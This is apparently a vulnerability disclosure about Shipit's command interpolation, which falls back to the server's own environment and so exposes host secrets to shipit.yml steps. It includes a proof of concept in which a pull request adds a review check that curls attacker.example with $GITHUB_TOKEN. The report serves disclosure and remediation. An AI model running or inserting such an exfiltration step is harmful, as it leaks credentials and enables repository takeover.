### Title
`shipit.yml` command interpolation falls back to the Shipit server's own process environment, letting any repository/task command exfiltrate secrets never granted to the task — ([File: lib/shipit/environment_variables.rb])

### Summary
`Command#interpolated_arguments` (`lib/shipit/command.rb`) expands `$VAR` references in `shipit.yml`-defined step commands via `EnvironmentVariables#interpolate`. When a referenced variable is absent from the explicitly-computed/whitelisted task `env` hash, the code silently falls back to the Shipit **host process's own `ENV`**, not an empty value or an error.

### Finding Description
`lib/shipit/environment_variables.rb`:
```ruby
def interpolate(argument)
  return argument unless @env
  argument.gsub(/(\$\w+)/) do |variable|
    variable.sub!('$', '')
    Shellwords.escape(@env.fetch(variable) { ENV[variable] })
  end
end
``` [1](#0-0) 

This is invoked by `Command#interpolate_environment_variables` → `interpolated_arguments`, which is what actually gets `PTY.spawn`'d: [2](#0-1) [3](#0-2) 

Meanwhile, the engine has a separate, deliberate trust boundary for task/deploy environment variables: `EnvironmentVariables#permit` enforces a strict whitelist (`deploy_variables` / task `variables_with_defaults`) and raises `NotPermitted` for anything not declared in `shipit.yml`'s `deploy.variables`/`tasks.<name>.variables`: [4](#0-3) [5](#0-4) 

This whitelist is the "environment key permitted" side of the binding — it is what the API/task trigger UI enforces (`app/models/shipit/stack.rb#trigger_task`, `build_deploy`) so that unprivileged submitters of an `env` payload can only set pre-declared keys (proven by `test/controllers/api/tasks_controller_test.rb`'s `"Variables DANGEROUS_VARIABLE have not been whitelisted"` test).

However, `interpolate` (used at command-spawn time inside `Command`) is a **completely different code path with no whitelist check at all**. Because `shipit.yml` step commands are plain shell strings written by whoever controls the repository's `shipit.yml` (including, for review stacks, an unmerged PR branch — an unapproved ref, matching the "ref approved vs. ref whose `shipit.yml` steps execute" trust boundary explicitly called out as in-scope), any step can reference an arbitrary `$VARNAME`. If that name is not part of the task's permitted/whitelisted `env`, the fallback `ENV[variable]` reads it straight from the Shipit Rails process's real OS environment — the same process that holds `GITHUB_TOKEN`/App private key material, `SECRET_KEY_BASE`, `api_clients_secret`, database URLs, etc., as configured via `config/secrets.yml`/`ENV` (see `template.rb` and `docs/setup.md`, which show these values loaded from `ENV['...']` into the running process).

So the "environment key permitted" set (whitelisted `deploy_variables`/task `variables`) and the "environment key spawned" set (anything resolvable via `ENV[...]` inside `interpolate`) are not the same set — the spawn-time interpolation silently widens the binding to the entire host process environment.

### Impact Explanation
Any `shipit.yml` author (which, for auto-provisioned review stacks, can be an external PR submitter whose ref was never merged/approved) can add a deploy/task/review step such as:
```yaml
review:
  checks:
    - "curl https://attacker.example/leak?token=$GITHUB_TOKEN"
```
When Shipit executes this via `Command`, `interpolate` resolves `$GITHUB_TOKEN` from the Shipit server process environment (falling back through `ENV.fetch` in `environment_variables.rb`) even though `GITHUB_TOKEN` was never in the task's permitted `env` and the whitelist check (`EnvironmentVariables#permit`) is never invoked on this path. This directly satisfies the "Critical" impact category: exfiltration of the app's `GITHUB_TOKEN`/`github_access_token`/`api_clients_secret` from a boundary the attacker was never granted (only their unmerged/unapproved ref content, not host secrets).

### Likelihood Explanation
Reachable by anyone able to get a `shipit.yml`/step definition executed by the engine without prior owner review — most directly via review-stack auto-provisioning from a pull request (an unapproved ref), which is a documented, expected Shipit feature (`docs/review_stacks.md`), not a misconfiguration. No token, TLS interception, or privileged account is required — only the ability to open/edit a PR whose branch is auto-provisioned as a review stack, or to be a contributor able to edit `shipit.yml` deploy/task/review step commands.

### Recommendation
Remove the `ENV[variable]` fallback in `EnvironmentVariables#interpolate`; unresolved variables should either raise or resolve to an empty string, never to the Shipit server process's own environment. Route command-line interpolation through the same `permit`/whitelist mechanism already used for task/deploy `env`, so that `interpolate` can only ever resolve variables in the pre-validated whitelist.

### Proof of Concept
1. Configure Shipit with `GITHUB_TOKEN`/other secrets exported into the Rails server process environment (standard deployment, e.g. via `template.rb`'s `ENV['...']` usage).
2. As an external contributor, open a pull request against a repository with review-stack auto-provisioning enabled, adding to the PR branch's `shipit.yml`:
   ```yaml
   review:
     checks:
       - "curl https://attacker.example/?leak=$GITHUB_TOKEN"
   ```
3. Shipit auto-provisions and runs `review.checks` for the (unmerged, unapproved) PR ref via `Command`/`TaskCommands`.
4. `Command#interpolated_arguments` calls `EnvironmentVariables#interpolate`, which does not find `GITHUB_TOKEN` in the task's permitted `env`, and falls back to `ENV['GITHUB_TOKEN']` — the Shipit host process's real token — embedding it in the spawned shell command, which exfiltrates it to the attacker's endpoint. [1](#0-0) [6](#0-5)

### Citations

**File:** lib/shipit/environment_variables.rb (L13-18)
```ruby
    def permit(variable_definitions)
      return {} unless @env
      raise "A whitelist is required to sanitize environment variables" unless variable_definitions

      sanitize_env_vars(variable_definitions)
    end
```

**File:** lib/shipit/environment_variables.rb (L20-27)
```ruby
    def interpolate(argument)
      return argument unless @env

      argument.gsub(/(\$\w+)/) do |variable|
        variable.sub!('$', '')
        Shellwords.escape(@env.fetch(variable) { ENV[variable] })
      end
    end
```

**File:** lib/shipit/command.rb (L51-55)
```ruby
    def interpolate_environment_variables(argument)
      return argument.map { |a| interpolate_environment_variables(a) } if argument.is_a?(Array)

      EnvironmentVariables.with(env).interpolate(argument)
    end
```

**File:** lib/shipit/command.rb (L81-101)
```ruby
    def interpolated_arguments
      interpolate_environment_variables(@args)
    end

    def start(&block)
      return if @started

      @control_block = block
      @out = @pid = nil
      FileUtils.mkdir_p(@chdir)
      begin
        @out, child_in, @pid = PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)
        child_in.close
      rescue Errno::ENOENT
        raise NotFound, "#{Shellwords.split(interpolated_arguments.first).first}: command not found"
      rescue Errno::EACCES
        raise Denied, "#{Shellwords.split(interpolated_arguments.first).first}: Permission denied"
      end
      @started = true
      self
    end
```

**File:** app/models/shipit/deploy_spec.rb (L174-180)
```ruby
    def filter_deploy_envs(env)
      EnvironmentVariables.with(env).permit(deploy_variables)
    end

    def filter_rollback_envs(env)
      EnvironmentVariables.with(env).permit(rollback_variables)
    end
```
